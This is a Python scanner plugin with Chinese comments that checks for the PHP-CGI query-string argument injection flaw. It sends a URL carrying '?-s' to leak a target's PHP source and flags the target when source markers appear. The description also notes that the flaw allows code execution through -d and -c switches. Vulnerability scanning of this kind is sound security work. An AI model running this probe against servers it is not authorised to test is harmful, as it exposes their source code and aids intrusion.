# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHP_0004'  # 平台漏洞编号，留空
    name = 'PHP-CGI 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2012-05-03'  # 漏洞公布时间
    desc = '''
        PHP是一种在服务器端执行的嵌入HTML文档的脚本语言。
        基于PHP-CGI的设置在解析PHP文件查询字符串参数时存在一个漏洞，允许远程攻击者可以利用漏洞执行任意代码。
        当使用PHP-CGI设置时(如Apache mod_cgid模块)，php-cgi接收查询字符串作为命令行参数，这些参数允许命令行开关如-s, -d或-c传递给php-cgi进程，可被利用泄露源代码或执行任意代码。
        如-s命令，允许攻击者获取index.php的源代码：http://localhost/index.php?-s
        其中Apache+mod_php和nginx+php-fpm不受此漏洞影响。
    '''  # 漏洞描述
    ref = 'http://www.venustech.com.cn/NewsInfo/124/13680.Html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHP'  # 漏洞应用名称
    product_version = 'php < 5.3.12 or php < 5.4.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '805d4e1b-5f53-4a70-9fde-fcc5bcc47b48'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload = '/login.php?-s'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url)

            if '$_SERVER' in res and '$_POST' in res and 'php' in res:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
